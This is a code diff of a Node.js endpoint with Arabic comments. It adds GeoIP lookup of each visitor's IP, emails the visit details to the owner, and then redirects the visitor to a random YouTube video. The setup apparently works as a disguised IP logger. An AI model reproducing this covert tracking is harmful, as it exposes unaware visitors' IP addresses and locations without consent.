@@ -1,6 +1,13 @@
 // api/index.js
 require('dotenv').config();
-const { getVisitContext, isPrivateIP, shouldSendForIp } = require('../lib/utils');
+
+const {
+  getVisitContext,
+  isPrivateIP,
+  shouldSendForIp,
+  getGeoData,        // ← مهم جداً
+} = require('../lib/utils');
+
 const { sendVisitEmail } = require('../lib/email');
 
 const YOUTUBE_VIDEOS = [
@@ -15,7 +22,7 @@ const YOUTUBE_VIDEOS = [
 ];
 
 module.exports = async (req, res) => {
-  // دعم HEAD requests (للـ health checks)
+  // دعم HEAD
   if (req.method === 'HEAD') {
     res.statusCode = 200;
     return res.end();
@@ -26,19 +33,24 @@ module.exports = async (req, res) => {
     return res.end('Method Not Allowed');
   }
 
+  // 1) جمع سياق الزيارة
   const ctx = getVisitContext(req);
 
-  // استخراج query params بطريقة مثالية ومضمونة
+  // 2) جلب الجيو GeoIP حسب الـ IP
+  ctx.geo = await getGeoData(ctx.clientIP);
+
+  // 3) قراءة الـ query params بطريقة سليمة
   let qp;
   try {
     const proto = req.headers['x-forwarded-proto']?.split(',')[0].trim() || 'https';
     const host = req.headers.host || 'localhost:3000';
-    const fullUrl = `\( {proto}:// \){host}${req.url}`;
+    const fullUrl = `${proto}://${host}${req.url}`;
     qp = new URL(fullUrl).searchParams;
   } catch {
     qp = new URLSearchParams(req.url.split('?')[1] || '');
   }
 
+  // 4) بناء الـ payload
   const payload = {
     utm: {
       source: qp.get('utm_source'),
@@ -53,18 +65,24 @@ module.exports = async (req, res) => {
 
   const ip = ctx.clientIP;
 
-  // إرسال الإيميل (مع throttle)
-  if (shouldSendForIp(ip) && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
+  // 5) إرسال الإيميل + throttle
+  if (
+    shouldSendForIp(ip) &&
+    process.env.EMAIL_TO &&
+    process.env.EMAIL_USER &&
+    process.env.EMAIL_APP_PASSWORD
+  ) {
     try {
       await sendVisitEmail({ payload, context: ctx });
-      console.log(`[EMAIL] تم الإرسال بنجاح إلى ${ip}`);
+      console.log(`[EMAIL] تم الإرسال بنجاح إلى: ${ip}`);
     } catch (err) {
-      console.error('[EMAIL] فشل الإرسال لكن مكملين:', err.message);
+      console.error('[EMAIL] فشل الإرسال لكن السيرفر شغّال:', err.message);
     }
   }
 
-  // ريدايركت عشوائي
-  const randomVideo = YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];
+  // 6) ريدايركت عشوائي
+  const randomVideo =
+    YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];
 
   res.statusCode = 302;
   res.setHeader('Location', randomVideo);
